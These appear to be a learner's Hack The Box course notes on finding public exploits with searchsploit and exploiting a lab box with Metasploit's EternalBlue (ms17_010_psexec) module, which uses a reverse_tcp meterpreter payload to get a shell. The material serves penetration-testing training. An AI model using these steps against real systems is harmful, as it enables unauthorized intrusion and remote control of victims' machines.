### Using Searchsploit
- A ton of tools are available to help us find public exploits for our use.
- Googling them is one way, but can be quite obtuse sometimes.
- Therefore, we can instead use a specific tool named `searchsploit` to do the job, which is a command line tool that connects to an online database filled with public vulnerabilities and exploits we can use.
- Installing it is simple, if we don't already have it. We can do that with the command below (if using a distro with the apt package manager):
```
secmancer@htb[/htb]$ sudo apt install exploitdb -y
```
- Once we have it setup, we can tell `searchsploit` to find what we want, using a format shown below:
```
secmancer@htb[/htb]$ searchsploit openssh 7.2

- Other online exploit databases are also avaliable:
	- [Exploit DB](https://www.exploit-db.com) 
	- [Rapid7 DB](https://www.rapid7.com/db/)
	- [Vulnerability Lab](https://www.vulnerability-lab.com). 


### Using Metasploit
- Metasploit, or the Metasploit Framework (MSF), is also another great tool, containing many built-in exploits for us to run and use.
- It also has other useful features, like:
	- Reconnaissance scripts to enumerate any remote and/or compromised target
	- Scripts to verify the existence of a certain vulnerability, without running the actual exploit
	- The Meterpreter payload, which has a bunch of tools to connect to shells and run commands on our target
	- Post-exploitation and pivoting tools for when we want to jump off from our target
- To start Metasploit, we can type in the `msfconsole` command into our terminal:
```
secmancer@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.

                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]

```
- Once running, the `search exploit` command allows us to find the exploit we are looking for.

> Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

- Once we find one we want to use, the `USE` allows us to tell Metasploit to use that exploit.
```
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
- Before running it, we need to configure it first.
- Many exploits have different options available to them, so we can run `show options` to see what this specific exploit needs to work properly.

- Any option marked with `Required` set to `yes` need a value for the exploit to work.
	- `RHOSTS`: IP of our target
	- `LHOST`: IP of our attacking host
- We can set those with the set command as well.
```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```
- We are almost ready to run it, but we can run a check to make sure that the server is in fact vulnerable to our specific exploit. While not available to every exploit within Metasploit, it is a very useful command to use when offered.
```
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check

[+] 10.10.10.40:445 - The target is vulnerable.
```
- We are now ready to go! To run it, we either use the `run` or `exploit` commands:

- As you can see, we were able to get successful access into the box and get an interactive shell!
- As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. 
- Overall, for us to be well-rounded testers, we must know how to best leverage all of the tools available to us.
- This includes understanding why they sometimes fail, and know to pivot to manual techniques or other tools when necessary.

### Questions
 - Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
